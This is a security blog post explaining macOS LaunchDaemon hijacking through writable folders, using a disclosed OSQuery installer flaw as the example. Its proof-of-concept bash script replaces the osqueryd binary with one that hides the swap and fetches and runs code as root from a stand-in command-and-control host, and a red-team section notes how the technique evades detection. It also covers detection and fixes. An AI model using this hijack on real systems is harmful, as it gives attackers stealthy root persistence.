<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>LaunchDaemon Hijacking: privilege escalation and persistence via insecure folder permissions | bradleyjkemp</title>
<meta name="keywords" content="">
<meta name="description" content="LaunchDaemon (or LaunchAgent) Hijacking is a MacOS privilege escalation and persistence technique. It involves abusing insecure file/folder permissions to replace legitimately installed, misconfigured LaunchDaemons with malicious code.
I first spotted this issue affecting the OSQuery installer but went looking and found multiple other products with the same problem. This isn&rsquo;t a novel technique (it&rsquo;s briefly mentioned in T1543.004) but I was surprised to find it so rarely talked about.
Example &ndash; Hijacking the OSQuery LaunchDaemon üòá I&rsquo;ve already disclosed this issue to the OSQuery team and they kindly let me use it as an example in this post.">
<meta name="author" content="Bradley Kemp">
<link rel="canonical" href="https://bradleyjkemp.dev/post/launchdaemon-hijacking/">
<link crossorigin="anonymous" href="https://bradleyjkemp.dev/assets/css/stylesheet.fc220c15db4aef0318bbf30adc45d33d4d7c88deff3238b23eb255afdc472ca6.css" integrity="sha256-/CIMFdtK7wMYu/MK3EXTPU18iN7/MjiyPrJVr9xHLKY=" rel="preload stylesheet" as="style">
<link rel="icon" href="https://bradleyjkemp.dev/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="https://bradleyjkemp.dev/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="https://bradleyjkemp.dev/favicon-32x32.png">
<link rel="apple-touch-icon" href="https://bradleyjkemp.dev/apple-touch-icon.png">
<link rel="mask-icon" href="https://bradleyjkemp.dev/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --code-block-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript><link rel="webmention" href="https://webmention.io/bradleyjkemp.dev/webmention" />
<link rel="pingback" href="https://webmention.io/bradleyjkemp.dev/xmlrpc" />





   
   <!-- Thanks for using github/divinerites/plausible-hugo v1.20.0. Please, consider leaving a star on Github if you like it. -->











    
        <link rel="preconnect" href="https://stats.bradleyjkemp.dev">
    
        
            
            <script defer  data-domain="bradleyjkemp.dev" src="https://stats.bradleyjkemp.dev/js/script.js" ></script>

<!-- If you are using Content-Security-Policy, do not forget to add this code to your CSP : 
  script-src 'unsafe-inline' https://stats.bradleyjkemp.dev
  connect-src 'unsafe-inline' https://stats.bradleyjkemp.dev
  or just add the partial 'plausible_csp.html' to those 2 csp directives in your 'index.headers' file
-->



    
    <script>window.plausible = window.plausible || function() { (window.plausible.q = window.plausible.q || []).push(arguments) }</script>
    <script>
         
         
         
    </script>

    
<meta property="og:title" content="LaunchDaemon Hijacking: privilege escalation and persistence via insecure folder permissions" />
<meta property="og:description" content="LaunchDaemon (or LaunchAgent) Hijacking is a MacOS privilege escalation and persistence technique. It involves abusing insecure file/folder permissions to replace legitimately installed, misconfigured LaunchDaemons with malicious code.
I first spotted this issue affecting the OSQuery installer but went looking and found multiple other products with the same problem. This isn&rsquo;t a novel technique (it&rsquo;s briefly mentioned in T1543.004) but I was surprised to find it so rarely talked about.
Example &ndash; Hijacking the OSQuery LaunchDaemon üòá I&rsquo;ve already disclosed this issue to the OSQuery team and they kindly let me use it as an example in this post." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://bradleyjkemp.dev/post/launchdaemon-hijacking/" />
<meta property="og:image" content="https://bradleyjkemp.dev/post/launchdaemon-hijacking/launchdoh.png" /><meta property="article:section" content="post" />
<meta property="article:published_time" content="2021-05-10T00:00:00+00:00" />
<meta property="article:modified_time" content="2021-05-10T00:00:00+00:00" />

<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:image" content="https://bradleyjkemp.dev/post/launchdaemon-hijacking/launchdoh.png" />
<meta name="twitter:title" content="LaunchDaemon Hijacking: privilege escalation and persistence via insecure folder permissions"/>
<meta name="twitter:description" content="LaunchDaemon (or LaunchAgent) Hijacking is a MacOS privilege escalation and persistence technique. It involves abusing insecure file/folder permissions to replace legitimately installed, misconfigured LaunchDaemons with malicious code.
I first spotted this issue affecting the OSQuery installer but went looking and found multiple other products with the same problem. This isn&rsquo;t a novel technique (it&rsquo;s briefly mentioned in T1543.004) but I was surprised to find it so rarely talked about.
Example &ndash; Hijacking the OSQuery LaunchDaemon üòá I&rsquo;ve already disclosed this issue to the OSQuery team and they kindly let me use it as an example in this post."/>


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Posts",
      "item": "https://bradleyjkemp.dev/post/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "LaunchDaemon Hijacking: privilege escalation and persistence via insecure folder permissions",
      "item": "https://bradleyjkemp.dev/post/launchdaemon-hijacking/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "LaunchDaemon Hijacking: privilege escalation and persistence via insecure folder permissions",
  "name": "LaunchDaemon Hijacking: privilege escalation and persistence via insecure folder permissions",
  "description": "LaunchDaemon (or LaunchAgent) Hijacking is a MacOS privilege escalation and persistence technique. It involves abusing insecure file/folder permissions to replace legitimately installed, misconfigured LaunchDaemons with malicious code.\nI first spotted this issue affecting the OSQuery installer but went looking and found multiple other products with the same problem. This isn\u0026rsquo;t a novel technique (it\u0026rsquo;s briefly mentioned in T1543.004) but I was surprised to find it so rarely talked about.\nExample \u0026ndash; Hijacking the OSQuery LaunchDaemon üòá I\u0026rsquo;ve already disclosed this issue to the OSQuery team and they kindly let me use it as an example in this post.",
  "keywords": [
    
  ],
  "articleBody": "LaunchDaemon (or LaunchAgent) Hijacking is a MacOS privilege escalation and persistence technique. It involves abusing insecure file/folder permissions to replace legitimately installed, misconfigured LaunchDaemons with malicious code.\nI first spotted this issue affecting the OSQuery installer but went looking and found multiple other products with the same problem. This isn‚Äôt a novel technique (it‚Äôs briefly mentioned in T1543.004) but I was surprised to find it so rarely talked about.\nExample ‚Äì Hijacking the OSQuery LaunchDaemon üòá I‚Äôve already disclosed this issue to the OSQuery team and they kindly let me use it as an example in this post. A fix will hopefully be coming in a future release ü§ûüèª What is OSQuery? OSQuery is a monitoring tool that lets you remotely query the configuration and status of hosts using SQL. On MacOS, this is accomplished by running a LaunchDaemon on each laptop that syncs with a backend server.\nThe OSQuery installer creates a binary called /usr/local/bin/osqueryd and sets up a LaunchDaemon via /Library/LaunchDaemons/com.facebook.osqueryd.plist:\n\u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e \u003c!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\"\u003e KeepAlive Disabled Label com.facebook.osqueryd ProgramArguments /usr/local/bin/osqueryd --flagfile=/private/var/osquery/osquery.flags RunAtLoad ThrottleInterval 60 Which, at a high level, looks like this: On a default MacOS install, this is perfectly safe:\n/Library/LaunchDaemons/com.facebook.osqueryd.plist can‚Äôt be tampered with to run anything other than /usr/local/bin/osqueryd ‚úÖ /usr/local/bin/osqueryd can‚Äôt be modified to include malicious code ‚úÖ How is this exploitable? While /usr/local/bin is a secure folder to store binaries on a default MacOS install, this isn‚Äôt the case on many real-world systems.\nMany people install a package manager called Homebrew which, during installation, makes the /usr/local/bin folder writable by the current user (even if they‚Äôre not an admin). This subtly changes the picture: Now, although a normal user can‚Äôt modify the /usr/local/bin/osqueryd file directly, they can simply replace it!\nBecause /usr/local/bin is globally writeable, any user on the system has permission to:\nDelete files in this folder‚Äîfor example, the real osqueryd binary. Create files in this folder‚Äîfor example, some malware named osqueryd. Proof of concept # 1. Move the original osqueryd binary somewhere else mv /usr/local/bin/osqueryd /usr/local/bin/.osquery/osqueryd # 2. Create our replacement osqueryd cat \u003c\u003c EOF \u003e /usr/local/bin/osqueryd #!/bin/bash # Firstly start the original osqueryd binary in the background # (so no one notices we've hijacked it) /usr/local/bin/.osquery/osqueryd \u0026 # Then run our malicious payload e.g. a JXA stager /usr/bin/osascript -l JavaScript -e \"eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding($.NSData.dataWithContentsOfURL($.NSURL.URLWithString('https://my-c2.com')),$.NSUTF8StringEncoding)));\" EOF # 3. Reboot the machine. Our payload will be started as root on start-up osascript -e 'tell application \"System Events\" to restart' This short script demonstrates a complete LaunchDaemon Hijack:\nFirstly it moves the real osqueryd binary to a hidden folder. It then creates a payload in /usr/local/bin/osqueryd that: Starts the original osqueryd binary in the background (to help avoid anyone noticing the LaunchDaemon has been hijacked). Runs a backdoor. Finally it reboots the machine to force the OSQuery LaunchDaemon to restart. This step is optional but otherwise we won‚Äôt get code execution until the user restarts themselves. Once exploited, the system looks like this: Exploiting this in general OSQuery is not alone in being vulnerable to this technique. The change in /usr/local/bin permissions during a Homebrew install is a particularly common cause of this issue.\nA secure (non-hijackable) LaunchDaemon needs to look like this: All four of those padlocks needs to be correctly present to avoid being vulnerable. A non-root user mustn‚Äôt be able to:\nModify any file within /Library/LaunchDaemons Create files within /Library/LaunchDaemons Modify any binary referenced by /Library/LaunchDaemons/*.plist Create binaries within a folder referenced by /Library/LaunchDaemons/*.plist Developers and admins are pretty good at getting points 1‚Äì3 right. It‚Äôs point 4 where problems are most likely to arise‚Äîfolder permissions are just a bit more confusing than file permissions.\nWhat to do about LaunchDaemon Hijacking For red teamers LaunchDaemon Hijacking can be a particularly sneaky way to achieve both persistence and privilege escalation on MacOS. Because it doesn‚Äôt create or modify any of the *.plist files in /Library/LaunchDaemons or /Library/LaunchAgents, it‚Äôs not going to trigger any detection rules looking for changes in these folders.\nIf you‚Äôre willing to wait until the user reboots the machine themselves, this is a way to gain root privileges without doing something as obvious as phishing the user for their laptop password.\nOf course, this technique can also apply to a user‚Äôs personal LaunchAgents (configured in /Users/username/Library/LaunchAgents). These are very likely run binaries that can be hijacked to achieve persistence (though you won‚Äôt gain any additional privileges this way).\nFor blue teamers Protective measures Thankfully, LaunchDaemon Hijacking opportunities are fairly easy to detect and fix.\nAll you need to look for is any /Library/LaunchDaemons/*.plist or /Library/LaunchAgents/*.plist file where either:\nThe binary being launched is writeable by non-root users. The binary being launched is in a directory writeable by non-root users. The fix is simply to fix the file permissions or move the binary to a more secure location.\nüîç Here is a small script that logs LaunchDaemons which are hijackable by the current user: launchdaemon_hijacking.go\n‚ö†Ô∏è Beware, this script doesn‚Äôt detect more nuanced cases. For example, where a LaunchDaemon runs bash with a hijackable script as an argument.\nDetective measures If you can‚Äôt fix a LaunchDaemon, your best bet is probably File Integrity Monitoring.\nBecause this technique requires replacing the LaunchDaemon binary, you‚Äôll be able to detect it by regularly computing file checksums and comparing against known-good values.\nA pretty good way to monitor the integrity of LaunchDaemons is actually OSQuery itself‚Ä¶\n",
  "wordCount" : "908",
  "inLanguage": "en",
  "image":"https://bradleyjkemp.dev/post/launchdaemon-hijacking/launchdoh.png","datePublished": "2021-05-10T00:00:00Z",
  "dateModified": "2021-05-10T00:00:00Z",
  "author":{
    "@type": "Person",
    "name": "Bradley Kemp"
  },
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://bradleyjkemp.dev/post/launchdaemon-hijacking/"
  },
  "publisher": {
    "@type": "Person",
    "name": "bradleyjkemp",
    "logo": {
      "@type": "ImageObject",
      "url": "https://bradleyjkemp.dev/favicon.ico"
    }
  }
}
</script>
</head>

<body class="" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="https://bradleyjkemp.dev" accesskey="h" title="bradleyjkemp (Alt + H)">bradleyjkemp</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    
    <h1 class="post-title entry-hint-parent">
      LaunchDaemon Hijacking: privilege escalation and persistence via insecure folder permissions
    </h1>
    <div class="post-meta"><span title='2021-05-10 00:00:00 +0000 UTC'>May 10, 2021</span>&nbsp;¬∑&nbsp;5 min&nbsp;¬∑&nbsp;Bradley Kemp

</div>
  </header> 
<figure class="entry-cover">
        <img loading="eager" srcset="https://bradleyjkemp.dev/post/launchdaemon-hijacking/launchdoh_huc37364f64ae7875fa79f0cdb7a0e7712_363719_360x0_resize_box_3.png 360w ,https://bradleyjkemp.dev/post/launchdaemon-hijacking/launchdoh_huc37364f64ae7875fa79f0cdb7a0e7712_363719_480x0_resize_box_3.png 480w ,https://bradleyjkemp.dev/post/launchdaemon-hijacking/launchdoh_huc37364f64ae7875fa79f0cdb7a0e7712_363719_720x0_resize_box_3.png 720w ,https://bradleyjkemp.dev/post/launchdaemon-hijacking/launchdoh_huc37364f64ae7875fa79f0cdb7a0e7712_363719_1080x0_resize_box_3.png 1080w ,https://bradleyjkemp.dev/post/launchdaemon-hijacking/launchdoh.png 1180w" 
            sizes="(min-width: 768px) 720px, 100vw" src="https://bradleyjkemp.dev/post/launchdaemon-hijacking/launchdoh.png" alt="" 
            width="1180" height="663">
        
</figure>
  <div class="post-content"><p>LaunchDaemon (or LaunchAgent) Hijacking is a MacOS privilege escalation and persistence technique.
It involves abusing insecure file/folder permissions to replace legitimately installed, misconfigured LaunchDaemons with malicious code.</p>
<p>I first spotted this issue affecting the <a href="https://osquery.io">OSQuery</a> installer but went looking and found multiple other products with the same problem.
This isn&rsquo;t a novel technique (it&rsquo;s briefly mentioned in <a href="https://attack.mitre.org/versions/v9/techniques/T1543/004/">T1543.004</a>) but I was surprised to find it so rarely talked about.</p>
<h2 id="demo">Example &ndash; Hijacking the OSQuery LaunchDaemon<a hidden class="anchor" aria-hidden="true" href="#demo">#</a></h2>

<style>
  #callout {
    background: var(--code-bg);
    padding: 1.5em 1.25em;
    border-radius: 3px;
    display: flex;
    flex-direction: row;
    margin-bottom: 20px;
  }
  #callout-inner {
    margin-left: 1em;
  }
  @media (max-width: 767px) {
    #callout {
    padding: 1.5em 0.75em 1.5em 0.6em;
    }
    #callout-inner {
      margin-left: 0.5em;
    }
  }
</style>
<div id="callout" style="">
  <div>üòá</div>
	<div id="callout-inner">
    I&rsquo;ve already disclosed this issue to the OSQuery team and they kindly let me use it as an example in this post. A fix will hopefully be coming in a future release ü§ûüèª
  </div>
</div>
<h3 id="what-is-osquery">What is OSQuery?<a hidden class="anchor" aria-hidden="true" href="#what-is-osquery">#</a></h3>
<p><a href="https://osquery.io">OSQuery</a> is a monitoring tool that lets you remotely query the configuration and status of hosts using SQL.
On MacOS, this is accomplished by running a LaunchDaemon on each laptop that syncs with a backend server.</p>
<p>The OSQuery installer creates a binary called <code>/usr/local/bin/osqueryd</code> and sets up a LaunchDaemon via <code>/Library/LaunchDaemons/com.facebook.osqueryd.plist</code>:</p>
<pre tabindex="0"><code class="language-plist" data-lang="plist">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;
&lt;!DOCTYPE plist PUBLIC &#34;-//Apple//DTD PLIST 1.0//EN&#34; &#34;http://www.apple.com/DTDs/PropertyList-1.0.dtd&#34;&gt;
&lt;plist version=&#34;1.0&#34;&gt;
&lt;dict&gt;
  &lt;key&gt;KeepAlive&lt;/key&gt;
  &lt;true/&gt;
  &lt;key&gt;Disabled&lt;/key&gt;
  &lt;false/&gt;
  &lt;key&gt;Label&lt;/key&gt;
  &lt;string&gt;com.facebook.osqueryd&lt;/string&gt;
  &lt;key&gt;ProgramArguments&lt;/key&gt;
  &lt;array&gt;
    &lt;string&gt;/usr/local/bin/osqueryd&lt;/string&gt;
    &lt;string&gt;--flagfile=/private/var/osquery/osquery.flags&lt;/string&gt;
  &lt;/array&gt;
  &lt;key&gt;RunAtLoad&lt;/key&gt;
  &lt;true/&gt;
  &lt;key&gt;ThrottleInterval&lt;/key&gt;
  &lt;integer&gt;60&lt;/integer&gt;
&lt;/dict&gt;
&lt;/plist&gt;
</code></pre><p>Which, at a high level, looks like this:
<img loading="lazy" src="osquery-secure.png" alt="A boxes and arrows diagram with com.facebook.osqueryd.plist (within a /Library/LaunchDaemons box) has an arrow to osqueryd (within a /usr/local/bin box). All boxes are marked as secure."  />
</p>
<p>On a default MacOS install, this is perfectly safe:</p>
<ul>
<li><code>/Library/LaunchDaemons/com.facebook.osqueryd.plist</code> can&rsquo;t be tampered with to run anything other than <code>/usr/local/bin/osqueryd</code> ‚úÖ</li>
<li><code>/usr/local/bin/osqueryd</code> can&rsquo;t be modified to include malicious code ‚úÖ</li>
</ul>
<h3 id="how-is-this-exploitable">How is this exploitable?<a hidden class="anchor" aria-hidden="true" href="#how-is-this-exploitable">#</a></h3>
<p>While <code>/usr/local/bin</code> is a secure folder to store binaries on a default MacOS install, this isn&rsquo;t the case on many real-world systems.</p>
<p>Many people install a package manager called <a href="https://brew.sh/">Homebrew</a> which, during installation, makes the <code>/usr/local/bin</code> folder writable by the current user (even if they&rsquo;re not an admin).
This subtly changes the picture:
<img loading="lazy" src="osquery-insecure.png" alt="The same boxes and arrows diagram as before but now the /usr/local/bin box is no longer marked as secure."  />
</p>
<p>Now, although a normal user can&rsquo;t modify the <code>/usr/local/bin/osqueryd</code> file directly, they can simply replace it!</p>
<p>Because <code>/usr/local/bin</code> is globally writeable, <em>any</em> user on the system has permission to:</p>
<ul>
<li>Delete files in this folder&mdash;for example, the real <code>osqueryd</code> binary.</li>
<li>Create files in this folder&mdash;for example, some malware named <code>osqueryd</code>.</li>
</ul>
<h3 id="proof-of-concept">Proof of concept<a hidden class="anchor" aria-hidden="true" href="#proof-of-concept">#</a></h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># 1. Move the original osqueryd binary somewhere else</span>
</span></span><span style="display:flex;"><span>mv /usr/local/bin/osqueryd /usr/local/bin/.osquery/osqueryd
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 2. Create our replacement osqueryd</span>
</span></span><span style="display:flex;"><span>cat <span style="color:#e6db74">&lt;&lt; EOF &gt; /usr/local/bin/osqueryd
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  #!/bin/bash
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  # Firstly start the original osqueryd binary in the background
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  # (so no one notices we&#39;ve hijacked it)
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  /usr/local/bin/.osquery/osqueryd &amp;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  # Then run our malicious payload e.g. a JXA stager
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  /usr/bin/osascript -l JavaScript -e &#34;eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding($.NSData.dataWithContentsOfURL($.NSURL.URLWithString(&#39;https://my-c2.com&#39;)),$.NSUTF8StringEncoding)));&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">EOF</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 3. Reboot the machine. Our payload will be started as root on start-up </span>
</span></span><span style="display:flex;"><span>osascript -e <span style="color:#e6db74">&#39;tell application &#34;System Events&#34; to restart&#39;</span> 
</span></span></code></pre></div><p>This short script demonstrates a complete LaunchDaemon Hijack:</p>
<ol>
<li>Firstly it moves the real <code>osqueryd</code> binary to a hidden folder.</li>
<li>It then creates a payload in <code>/usr/local/bin/osqueryd</code> that:
<ul>
<li>Starts the original <code>osqueryd</code> binary in the background (to help avoid anyone noticing the LaunchDaemon has been hijacked).</li>
<li>Runs a backdoor.</li>
</ul>
</li>
<li>Finally it reboots the machine to force the OSQuery LaunchDaemon to restart. This step is optional but otherwise we won&rsquo;t get code execution until the user restarts themselves.</li>
</ol>
<p>Once exploited, the system looks like this:
<img loading="lazy" src="osquery-exploited.png" alt="Similar to the previous boxes and arrows diagram. Now the real osqueryd box has been moved and a fake osqueryd box (marked as malware) has taken its place."  />
</p>
<h2 id="exploiting-this-in-general">Exploiting this in general<a hidden class="anchor" aria-hidden="true" href="#exploiting-this-in-general">#</a></h2>
<p>OSQuery is not alone in being vulnerable to this technique.
The change in <code>/usr/local/bin</code> permissions during a Homebrew install is a particularly common cause of this issue.</p>
<p>A secure (non-hijackable) LaunchDaemon needs to look like this:
<img loading="lazy" src="launchdaemon-secure.png" alt="A generic version of the previous boxes and arrows diagrams: my-daemon.plist (within a /Library/LaunchDaemons box) has an arrow to my-daemon (within a /path/to/daemons box). All boxes are marked as secure."  />
</p>
<p>All four of those padlocks needs to be correctly present to avoid being vulnerable.
A non-root user mustn&rsquo;t be able to:</p>
<ol>
<li>Modify any file within <code>/Library/LaunchDaemons</code></li>
<li>Create files within <code>/Library/LaunchDaemons</code></li>
<li>Modify any binary referenced by <code>/Library/LaunchDaemons/*.plist</code></li>
<li>Create binaries within a folder referenced by <code>/Library/LaunchDaemons/*.plist</code></li>
</ol>
<p>Developers and admins are pretty good at getting points 1&ndash;3 right.
It&rsquo;s point 4 where problems are most likely to arise&mdash;folder permissions are just a bit more confusing than file permissions.</p>
<h2 id="what-to-do-about-launchdaemon-hijacking">What to do about LaunchDaemon Hijacking<a hidden class="anchor" aria-hidden="true" href="#what-to-do-about-launchdaemon-hijacking">#</a></h2>
<h3 id="for-red-teamers">For red teamers<a hidden class="anchor" aria-hidden="true" href="#for-red-teamers">#</a></h3>
<p>LaunchDaemon Hijacking can be a particularly sneaky way to achieve both persistence and privilege escalation on MacOS.
Because it doesn&rsquo;t create or modify any of the <code>*.plist</code> files in <code>/Library/LaunchDaemons</code> or <code>/Library/LaunchAgents</code>,
it&rsquo;s not going to trigger any detection rules looking for changes in these folders.</p>
<p>If you&rsquo;re willing to wait until the user reboots the machine themselves, this is a way to gain root privileges without doing something as obvious as phishing the user for their laptop password.</p>
<p>Of course, this technique can also apply to a user&rsquo;s personal LaunchAgents (configured in <code>/Users/username/Library/LaunchAgents</code>).
These are very likely run binaries that can be hijacked to achieve persistence
(though you won&rsquo;t gain any additional privileges this way).</p>
<h3 id="for-blue-teamers">For blue teamers<a hidden class="anchor" aria-hidden="true" href="#for-blue-teamers">#</a></h3>
<h4 id="protective-measures">Protective measures<a hidden class="anchor" aria-hidden="true" href="#protective-measures">#</a></h4>
<p>Thankfully, LaunchDaemon Hijacking opportunities are fairly easy to detect and fix.</p>
<p>All you need to look for is any <code>/Library/LaunchDaemons/*.plist</code> or <code>/Library/LaunchAgents/*.plist</code> file where either:</p>
<ul>
<li>The binary being launched is writeable by non-root users.</li>
<li>The binary being launched is in a directory writeable by non-root users.</li>
</ul>
<p>The fix is simply to fix the file permissions or move the binary to a more secure location.</p>

<style>
  #callout {
    background: var(--code-bg);
    padding: 1.5em 1.25em;
    border-radius: 3px;
    display: flex;
    flex-direction: row;
    margin-bottom: 20px;
  }
  #callout-inner {
    margin-left: 1em;
  }
  @media (max-width: 767px) {
    #callout {
    padding: 1.5em 0.75em 1.5em 0.6em;
    }
    #callout-inner {
      margin-left: 0.5em;
    }
  }
</style>
<div id="callout" style="">
  <div>üîç</div>
	<div id="callout-inner">
    <p>Here is a small script that logs LaunchDaemons which are hijackable by the current user: <a href="https://gist.github.com/bradleyjkemp/b099abb85648bd8497af404f70487b88">launchdaemon_hijacking.go</a></p>
<p>‚ö†Ô∏è Beware, this script doesn&rsquo;t detect more nuanced cases. For example, where a LaunchDaemon runs bash with a hijackable script as an argument.</p>

  </div>
</div>
<h4 id="detective-measures">Detective measures<a hidden class="anchor" aria-hidden="true" href="#detective-measures">#</a></h4>
<p>If you can&rsquo;t fix a LaunchDaemon, your best bet is probably <a href="https://en.wikipedia.org/wiki/File_integrity_monitoring">File Integrity Monitoring</a>.</p>
<p>Because this technique requires replacing the LaunchDaemon binary, you&rsquo;ll be able to detect it by regularly computing file checksums and comparing against known-good values.</p>
<p>A pretty good way to monitor the integrity of LaunchDaemons is actually <a href="https://osquery.readthedocs.io/en/stable/deployment/file-integrity-monitoring/">OSQuery itself</a>&hellip;</p>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
    </ul>
<nav class="paginav">
  <a class="prev" href="https://bradleyjkemp.dev/post/suspicious-cvc/">
    <span class="title">¬´ Prev</span>
    <br>
    <span>A Suspicious CVC</span>
  </a>
  <a class="next" href="https://bradleyjkemp.dev/post/6-ways-to-detect-phishing-sites-using-high-entropy-strings/">
    <span class="title">Next ¬ª</span>
    <br>
    <span>6 ways to detect phishing sites using high-entropy strings</span>
  </a>
</nav>


<ul class="share-buttons">
    <li>
        <a target="_blank" rel="noopener noreferrer" aria-label="share LaunchDaemon Hijacking: privilege escalation and persistence via insecure folder permissions on x"
            href="https://x.com/intent/tweet/?text=LaunchDaemon%20Hijacking%3a%20privilege%20escalation%20and%20persistence%20via%20insecure%20folder%20permissions&amp;url=https%3a%2f%2fbradleyjkemp.dev%2fpost%2flaunchdaemon-hijacking%2f&amp;hashtags=">
            <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
                <path
                    d="M512 62.554 L 512 449.446 C 512 483.97 483.97 512 449.446 512 L 62.554 512 C 28.03 512 0 483.97 0 449.446 L 0 62.554 C 0 28.03 28.029 0 62.554 0 L 449.446 0 C 483.971 0 512 28.03 512 62.554 Z M 269.951 190.75 L 182.567 75.216 L 56 75.216 L 207.216 272.95 L 63.9 436.783 L 125.266 436.783 L 235.9 310.383 L 332.567 436.783 L 456 436.783 L 298.367 228.367 L 432.367 75.216 L 371.033 75.216 Z M 127.633 110 L 164.101 110 L 383.481 400.065 L 349.5 400.065 Z" />
            </svg>
        </a>
    </li>
    <li>
        <a target="_blank" rel="noopener noreferrer" aria-label="share LaunchDaemon Hijacking: privilege escalation and persistence via insecure folder permissions on linkedin"
            href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fbradleyjkemp.dev%2fpost%2flaunchdaemon-hijacking%2f&amp;title=LaunchDaemon%20Hijacking%3a%20privilege%20escalation%20and%20persistence%20via%20insecure%20folder%20permissions&amp;summary=LaunchDaemon%20Hijacking%3a%20privilege%20escalation%20and%20persistence%20via%20insecure%20folder%20permissions&amp;source=https%3a%2f%2fbradleyjkemp.dev%2fpost%2flaunchdaemon-hijacking%2f">
            <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
                <path
                    d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-288.985,423.278l0,-225.717l-75.04,0l0,225.717l75.04,0Zm270.539,0l0,-129.439c0,-69.333 -37.018,-101.586 -86.381,-101.586c-39.804,0 -57.634,21.891 -67.617,37.266l0,-31.958l-75.021,0c0.995,21.181 0,225.717 0,225.717l75.02,0l0,-126.056c0,-6.748 0.486,-13.492 2.474,-18.315c5.414,-13.475 17.767,-27.434 38.494,-27.434c27.135,0 38.007,20.707 38.007,51.037l0,120.768l75.024,0Zm-307.552,-334.556c-25.674,0 -42.448,16.879 -42.448,39.002c0,21.658 16.264,39.002 41.455,39.002l0.484,0c26.165,0 42.452,-17.344 42.452,-39.002c-0.485,-22.092 -16.241,-38.954 -41.943,-39.002Z" />
            </svg>
        </a>
    </li>
    <li>
